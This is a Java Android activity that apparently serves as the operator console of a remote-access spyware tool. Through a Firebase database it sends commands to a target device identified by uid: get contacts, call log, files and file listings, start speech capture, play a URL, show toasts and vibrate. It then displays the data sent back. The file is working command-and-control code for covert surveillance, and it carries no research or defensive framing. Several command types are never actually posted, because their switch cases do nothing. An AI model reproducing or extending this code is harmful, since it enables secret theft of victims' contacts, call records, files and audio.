package com.aei.androidsecuritymasterapp;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.AlertDialog;
import android.app.Dialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.aei.androidsecuritymasterapp.network.Command;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;

public class DeviceActivity extends AppCompatActivity {

    private String uid;
    private DatabaseReference responseReference;
    private ResponseHandler responseHandler;
    private ListView filesListView;
    private FileListAdapter fileListAdapter;
    private List<String> files;

    private final int[] buttonsId = {
            R.id.device_get_contacts
            ,R.id.device_get_calllog, R.id.device_get_file, R.id.device_get_filelist
            ,R.id.device_play_music, R.id.device_stop_music, R.id.device_send_toast
            ,R.id.device_send_vibrate, R.id.device_get_speech};
    private final Command.CommandType[] commandTypes = {
            Command.CommandType.GET_CONTACTS, Command.CommandType.GET_LOG, Command.CommandType.GET_FILE,
            Command.CommandType.GET_FILE_LIST, Command.CommandType.PLAY_MUSIC, Command.CommandType.STOP_MUSIC,
            Command.CommandType.TOAST, Command.CommandType.VIBRATE, Command.CommandType.START_SPEECH
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_device);
        filesListView = findViewById(R.id.files_list_view);
        files = new ArrayList<>();
        fileListAdapter = new FileListAdapter(this,R.id.file_item_address,files);
        uid = getIntent().getStringExtra("uid");
        responseHandler = new ResponseHandler(this);
        responseHandler.setOnSpeech(words ->
            new AlertDialog.Builder(this).setMessage(words).create().show()
        );
        responseHandler.setCallbacks(files -> {
            Log.e("Received","Size: " + files.size());
            this.files.clear();
            this.files.addAll(files);
            fileListAdapter.notifyDataSetChanged();
        });
        responseReference = FirebaseDatabase.getInstance()
                .getReference()
                .child("devices")
                .child(uid)
                .child("response");
        responseReference.addValueEventListener(valueEventListener);

        for(int i = 0 ; i < buttonsId.length ; i++){
            final int index = i;
            findViewById(buttonsId[i]).setOnClickListener(e->
                    sendCommand(commandTypes[index]));
        }
        filesListView.setAdapter(fileListAdapter);
        filesListView.setOnItemClickListener((parent, view, position, id) -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("file", files.get(position));
            if(clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(this,"File Copied to clipboard",Toast.LENGTH_SHORT).show();
            }
        });
    }

    private ValueEventListener valueEventListener = new ValueEventListener() {
        @Override
        public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
            try {
                Command value = dataSnapshot.getValue(Command.class);
                if(value != null)
                    responseHandler.handle(value);
                dataSnapshot.getRef().setValue(null);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void onCancelled(@NonNull DatabaseError databaseError) {

        }
    };

    private void getInput(String title, Command command){
        Dialog dialog = new Dialog(this);
        View view = getLayoutInflater().inflate(R.layout.input_dialog_layout,null);
        dialog.setContentView(view);
        Button ok = view.findViewById(R.id.input_dialog_ok);
        TextView titleTextView = view.findViewById(R.id.input_dialog_title);
        EditText input = view.findViewById(R.id.input_dialog_input);
        titleTextView.setText(title);
        ok.setOnClickListener(e->{
            command.setPayload(input.getText().toString());
            postCommand(command);
            dialog.dismiss();
        });
        dialog.show();
    }

    private void postCommand(Command command){
        if(command.getPayload() != null && !command.getPayload().isEmpty())
        command.setPayload(Base64.getEncoder().encodeToString(command.getPayload().getBytes()));
        FirebaseDatabase.getInstance().getReference()
                .child("devices")
                .child(uid)
                .child("command")
                .setValue(command);
    }

    private void sendCommand(Command.CommandType type){
        Command command = new Command().setType(type);
        switch (type){
            case GET_FILE:
                getInput("Enter File Name",command);
                break;
            case VIBRATE:
                postCommand(command.setPayload("2000"));
                break;
            case TOAST:
                getInput("Enter Toast Message",command);
                break;
            case PLAY_MUSIC:
                getInput("Enter URL",command);
                break;
            case START_SPEECH:
            case GET_LOG:
            case GET_CONTACTS:
            case GET_FILE_LIST:
            case STOP_MUSIC:
            default:
                break;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(this.responseReference != null)
            responseReference.removeEventListener(valueEventListener);
    }
}
